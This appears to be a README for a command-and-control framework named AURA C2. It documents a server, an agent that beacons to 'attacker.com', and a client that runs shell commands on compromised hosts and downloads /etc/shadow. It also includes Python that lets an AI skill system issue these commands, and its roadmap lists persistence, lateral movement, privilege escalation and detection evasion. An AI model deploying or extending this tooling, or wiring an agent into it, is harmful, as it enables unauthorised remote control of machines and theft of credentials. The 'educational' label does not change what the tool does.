# AURA C2 Framework

Lightweight command & control framework for agent management.

## Architecture

```
┌─────────────────┐
│  C2 Server      │  (aura-c2-server :9000)
│  - Agent mgt    │
│  - Task queue   │
│  - Result store │
└────────┬────────┘
         │ HTTP
    ┌────┴──────────┐
    │               │
┌───▼────┐    ┌────▼───┐
│ Agent 1 │    │ Agent 2 │
└────────┘    └────────┘

┌─────────────────┐
│  C2 Client      │  (CLI controller)
│  - Issue cmds   │
│  - View results │
└────────┬────────┘
         │ HTTP
    C2 Server
```

## Components

### aura-c2-server

HTTP server for managing agents.

```bash
./aura-c2-server
# Listens on :9000
```

### aura-c2-agent

Agent that beacons to C2 server.

```bash
./aura-c2-agent -c2 http://attacker.com:9000 -interval 30
```

### aura-c2-client

CLI for controlling agents.

```bash
./aura-c2-client -cmd list-agents
./aura-c2-client -cmd exec -agent <id> -task "id"
./aura-c2-client -cmd results -agent <id>
```

## Usage

### 1. Start C2 Server

```bash
./aura-c2-server
[*] C2 Server listening on :9000
```

### 2. Deploy Agent

```bash
./aura-c2-agent -c2 http://localhost:9000 -interval 10
[*] AURA C2 Agent Started
[*] Agent ID: abc123def456
[*] C2 Server: http://localhost:9000
[*] Beacon Interval: 30s
```

### 3. List Agents

```bash
./aura-c2-client -cmd list-agents
{
  "total": 1,
  "agents": [
    {
      "id": "abc123def456",
      "hostname": "target-pc",
      "username": "admin",
      "os": "linux",
      "last_checkin": "2024-08-31T12:34:56Z"
    }
  ]
}
```

### 4. Execute Command

```bash
./aura-c2-client -cmd exec -agent abc123def456 -task "whoami"
[+] Task created: task-1725123456
```

### 5. Get Results

```bash
./aura-c2-client -cmd results -agent abc123def456
{
  "agent": "abc123def456",
  "results": [
    {
      "task_id": "task-1725123456",
      "status": "success",
      "output": "root\n",
      "duration_ms": 45.23
    }
  ]
}
```

## Task Types

| Type | Description | Example |
|------|-------------|---------|
| shell | Execute shell command | `whoami`, `ls -la` |
| exec | Execute binary | `curl http://...` |
| info | Get agent info | - |
| upload | Upload file to agent | `src: /etc/passwd, dst: /tmp/passwd` |
| download | Download file from agent | `path: /etc/shadow` |

## Security Considerations

⚠️ **This is an educational framework. In production:**

- Use HTTPS with certificate pinning
- Implement authentication (API keys, mTLS)
- Encrypt task commands and results
- Add command whitelisting
- Implement rate limiting
- Use DNS over HTTPS for DNS exfiltration evasion

## Integration with AURA

Can be controlled from AURA skills:

```python
# backend/skills/custom/c2_control.py

import subprocess
import json

def list_agents():
    """List C2 agents"""
    result = subprocess.run(
        ["aura-c2-client", "-cmd", "list-agents"],
        capture_output=True,
        text=True
    )
    return json.loads(result.stdout)

def execute_task(agent_id: str, command: str):
    """Execute task on agent"""
    result = subprocess.run(
        ["aura-c2-client", "-cmd", "exec", "-agent", agent_id, "-task", command],
        capture_output=True,
        text=True
    )
    return result.stdout
```

## Performance

- Beacon latency: <100ms
- Command execution: <500ms (depends on task)
- Agent overhead: <5MB RAM
- Network footprint: ~2KB per beacon

## Advanced Features (Future)

- [ ] Multi-stage payloads
- [ ] Process injection
- [ ] Lateral movement
- [ ] Privilege escalation
- [ ] Persistence mechanisms
- [ ] Code obfuscation
- [ ] Encrypted P2P mesh
